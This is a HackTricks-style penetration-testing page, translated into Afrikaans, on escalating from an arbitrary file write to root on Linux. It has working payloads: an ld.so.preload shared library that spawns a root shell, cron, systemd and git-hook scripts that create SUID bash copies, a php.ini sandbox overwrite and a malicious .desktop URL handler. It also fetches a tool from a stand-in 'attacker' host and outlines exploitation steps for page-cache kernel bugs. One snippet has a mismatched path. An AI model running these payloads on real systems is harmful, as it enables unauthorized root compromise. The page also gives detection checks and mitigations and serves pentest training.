# Willekeurige lêerskryf na root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer tree soos die **`LD_PRELOAD`**-env-veranderlike op, maar dit werk ook in **SUID binaries**.\
As jy dit kan skep of wysig, kan jy eenvoudig ’n **pad na ’n library wat gelaai sal word** byvoeg met elke uitgevoerde binary.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **scripts** wat tydens verskeie **events** in 'n git repository **run** word, soos wanneer 'n commit geskep word, 'n merge... Dus, as 'n **privileged script or user** hierdie aksies gereeld uitvoer en dit moontlik is om in die **`.git` folder** te **skryf**, kan dit vir **privesc** gebruik word.

Dit is byvoorbeeld moontlik om 'n **script** in 'n git repo in **`.git/hooks`** te **genereer**, sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron- en tydlêers

As jy **cron-verwante lêers kan skryf wat root uitvoer**, kan jy gewoonlik code execution verkry die volgende keer wat die taak loop. Interessante teikens sluit in:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd` timers en die services wat hulle aktiveer

Vinnige kontroles:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipiese misbruikpaaie:

- **Voeg ’n nuwe root cron job by** `/etc/crontab` of ’n lêer in `/etc/cron.d/`
- **Vervang ’n script** wat reeds deur `run-parts` uitgevoer word
- **Plaas ’n backdoor in ’n bestaande timer-teiken** deur die script of binary wat dit launch, te wysig

Minimale cron payload-voorbeeld:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
As jy slegs binne ’n cron-gids kan skryf wat deur `run-parts` gebruik word, plaas eerder ’n uitvoerbare lêer daar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` ignoreer gewoonlik lêername wat punte bevat, dus verkies name soos `backup` eerder as `backup.sh`.
- Sommige distros gebruik `anacron` of `systemd` timers in plaas van klassieke cron, maar die misbruikidee is dieselfde: **wysig wat root later sal uitvoer**.

### Service- en Socket-lêers

As jy **`systemd` unit-lêers** of lêers waarna hulle verwys kan skryf, kan jy moontlik kode-uitvoering as root verkry deur die unit te herlaai en te herbegin, of deur te wag dat die service/socket-aktiveringspad geaktiveer word.

Interessante teikens sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries waarna `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys
- Skryfbare `EnvironmentFile=`-paaie wat deur ’n root-service gelaai word

Vinnige kontroles:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Algemene misbruikpaaie:

- **Overwrite `ExecStart=`** in a root-owned service unit wat jy kan wysig
- **Add a drop-in override** met ’n malicious `ExecStart=` en maak eers die ou een leeg
- **Backdoor the script/binary** waarna die unit reeds verwys
- **Hijack a socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n verbinding ontvang

Voorbeeld van ’n malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipiese aktiveringsvloei:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
As jy nie dienste self kan herbegin nie, maar ’n socket-activated unit kan wysig, hoef jy moontlik net **vir ’n kliëntverbinding te wag** om uitvoering van die backdoored diens as root te aktiveer.

### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP-sandbox gebruik word

Sommige custom daemons valideer gebruiker-verskafde PHP deur `php` met ’n **beperkte `php.ini`** uit te voer (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed kode steeds **enige write primitive** (soos `file_put_contents`) het en jy die **presiese `php.ini`-pad** kan bereik wat deur die daemon gebruik word, kan jy daardie config **oorskryf** om beperkings op te hef en dan ’n tweede payload indien wat met verhoogde privileges uitgevoer word.<sup>[[2]](#references)</sup>

Tipiese vloei:

1. Die eerste payload oorskryf die sandbox-config.
2. Die tweede payload voer kode uit noudat gevaarlike funksies weer geaktiveer is.

Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
As die daemon as root loop (of met root-owned paths valideer), lewer die tweede uitvoering ’n root-context. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.

### binfmt_misc

Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binary watter tipe lêers moet uitvoer. TODO: kyk na die vereistes om dit te abuse om ’n rev shell uit te voer wanneer ’n algemene lêertipe oopgemaak word.

### Oorskryf schema handlers (soos http: of https:)

’n Attacker met write permissions tot ’n victim se configuration directories kan maklik lêers vervang of skep wat system behavior verander, wat tot unintended code execution lei. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-handlers na ’n malicious file te wys (byvoorbeeld deur `x-scheme-handler/http=evil.desktop` te stel), verseker die attacker dat **die klik van enige http- of https-link code uitvoer wat in daardie `evil.desktop`-lêer gespesifiseer is**. Byvoorbeeld, nadat die volgende malicious code in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, voer enige external URL-click die embedded command uit:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Vir meer inligting, kyk na [**hierdie plasing**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om ’n werklike vulnerability te exploit.

### Root wat user-writable scripts/binaries uitvoer

As ’n privileged workflow iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne ’n directory wat deur ’n unprivileged user besit word), kan jy dit hijack:<sup>[[1]](#references)</sup>

- **Detect the execution:** monitor prosesse met [pspy](https://github.com/DominicBreuker/pspy) om root op te spoor wanneer dit user-controlled paths invoke:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bevestig skryfbaarheid:** maak seker dat beide die teikenlêer en sy gids deur jou gebruiker besit word/ skryfbaar is.
- **Kaap die teiken:** maak ’n rugsteun van die oorspronklike binary/script en plaas ’n payload wat ’n SUID shell skep (of enige ander root-aksie), en herstel dan die permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). Wanneer root die gekaapte pad weer uitvoer, kry die geëskaleerde shell met `./rootshell -p`.

### Slegs page-cache-wysiging van bevoorregte binaries

Sommige kernel-bugs wysig nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou toe om slegs die **page cache-kopie** van ’n leesbare lêer te wysig. As jy ’n **setuid**- of andersins **root-executed** binary kan teiken, kan die volgende uitvoering aanvaller-beheerde bytes uit die geheue uitvoer en privileges eskaleer, selfs al het die lêer-hash op skyf onveranderd gebly.

Dit is nuttig om hieraan te dink as ’n **runtime-only file write primitive**:

- **Skyf bly skoon**: die inode en bytes op skyf verander nie
- **Geheue is dirty**: prosesse wat die cached page lees/uitvoer, kry die deur die aanvaller gewysigde inhoud
- **Effek is tydelik**: die verandering verdwyn ná ’n reboot of wanneer die cache evict word

Hierdie primitive sit tussen klassieke **arbitrary file write** en ouer **page-cache abuse**-bugs soos Dirty COW / Dirty Pipe:

- Dirty COW het op ’n race staatgemaak
- Dirty Pipe het beperkings op die write position gehad
- ’n Page-cache-only primitive kan meer betroubaar wees as die kwesbare pad direkte writes na cached file-backed pages moontlik maak

#### Generic privesc flow

1. Kry ’n kernel primitive wat na **file-backed page cache pages** kan skryf
2. Gebruik dit teen ’n **leesbare bevoorregte binary** of ’n ander root-executed lêer
3. Trigger execution **voordat** die page uit die cache ge-evict word
4. Kry code execution as root terwyl die lêer op skyf steeds onveranderd lyk

Tipiese teikens met hoë waarde:

- **setuid-root** binaries
- Helpers wat deur **root services** geloods word
- Binaries wat algemeen uitgevoer word vanuit **containers wat die host kernel/page cache deel**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die kwesbare pad was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kan references na page-cache pages vanaf ’n leesbare lêer na die crypto TX scatterlist verskuif
- die in-place `algif_aead` decrypt path het source- en destination-buffers hergebruik
- `authencesn` het toe na die destination tag region geskryf
- wanneer daardie region steeds na spliced file-backed pages verwys het, het die write in die **page cache van die teikenlêer** geland

Die interessante tegniek is dus nie die CVE self nie, maar die patroon:

- **voer file-backed cache pages in ’n kernel-subsystem in**
- laat die subsystem hulle as writable output **behandel**
- trigger ’n klein, beheerde overwrite in die geheue

Die publieke PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in die geheue te patch en dit toe uitgevoer.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) wys ’n ander variant van dieselfde **page-cache-only write-to-root**-patroon, maar hierdie keer is die sink **IPsec ESP decrypt** in plaas van `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die belangrike tegniek is die **metadata-laundering-stap**:

- `splice()` plaas ’n **read-only file-backed page-cache page** in ’n ESP-in-UDP-pakkie
- die oorspronklike DirtyFrag-mitigering het daardie skb met `SKBFL_SHARED_FRAG` gemerk sodat `esp_input()` sou **kopieer voordat dit decrypt**
- netfilter `TEE` dupliseer die pakkie deur `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- die clone behou dieselfde **fisiese page-cache-reference**, maar verloor `SKBFL_SHARED_FRAG`
- `esp_input()` behandel die clone dan as veilig en voer **in-place `cbc(aes)` decrypt** oor die file-backed page uit

Die reviewer-les is dus breër as die CVE: indien ’n mitigering van **skb/page metadata** afhanklik is om te bepaal of ’n operasie eers moet kopieer, kan enige **clone/copy path wat die backing page behou maar die metadata laat val**, die write primitive stilweg heropen.

Tipiese exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` om **`CAP_NET_ADMIN` binne ’n private network namespace** te verkry
2. bring loopback op en installeer ’n **netfilter `TEE` rule** in `mangle/OUTPUT`
3. installeer **XFRM ESP transport SAs** via `NETLINK_XFRM`
4. enkodeer elke geteikende 4-byte word in die SA `seq_hi`-veld (DirtyFrag se word-selection-truuk)
5. stuur die spliced ESP-in-UDP-pakkie sodat die **TEE clone** `esp_input()` bereik en **in-place** decrypt
6. herhaal totdat die page-cache-kopie van `/usr/bin/su` of ’n ander bevoorregte executable aanvaller-beheerde code bevat

Operasioneel is die impak dieselfde as in die `AF_ALG`-voorbeeld: die lêer op skyf bly skoon, maar `execve()` gebruik die **gemuteerde page-cache-bytes** en lewer root.

Nuttige exposure checks vir hierdie variant:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Korttermyn-aanvalsoppervlakvermindering is ook hier padspesifiek: opgradering na 'n kernel wat `48f6a5356a33` bevat, herstel die clone-pad, terwyl die blokkering van `xt_TEE`-autoload die **flag-laundering step** verwyder en die blokkering van `esp4` / `esp6` die **decrypt sink** verwyder.

#### Blootstelling en hunting

As jy hierdie klas fout vermoed, moenie slegs op skyfintegriteitskontroles staatmaak nie. Verifieer ook:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as 'n module gelaai/ontlaai word
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die interface is in die kernel ingebou
- setuid binaries is goeie teikens omdat 'n page-cache-only patch genoeg kan wees om 'n plaaslike foothold in root te verander

#### Vermindering van die attack surface vir die `algif_aead`-pad

As die kwesbare interface deur 'n laaibare module verskaf word:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Indien dit in die kernel gekompileer word, het sommige disclosures gerapporteer dat dit die init path blokkeer met:
```bash
initcall_blacklist=algif_aead_init
```
Hierdie soort versagting is ook die moeite werd om vir ander kernel LPEs te onthou: indien exploitation van ’n spesifieke optional interface afhang, kan die deaktivering of blacklisting van daardie interface die exploit path breek, selfs voordat ’n volledige kernel-upgrade beskikbaar is.

## Verwysings

- [1] [HTB Bamboo – hijacking van ’n root-uitgevoerde script in ’n gebruiker-skryfbare PaperCut-gids](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security disclosure vir CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
